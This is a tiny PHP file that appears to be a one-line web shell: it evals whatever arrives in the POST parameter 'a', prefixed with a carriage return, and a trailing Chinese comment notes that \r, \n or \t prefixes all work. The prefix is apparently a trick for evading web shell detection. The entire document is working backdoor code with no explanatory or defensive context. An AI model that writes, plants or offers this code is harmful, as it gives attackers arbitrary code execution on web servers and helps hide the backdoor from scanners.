<?php
    $a = $_POST['a'];
    $b = "\r";
    eval($b.=$a);
?>
#\r\n\t都可以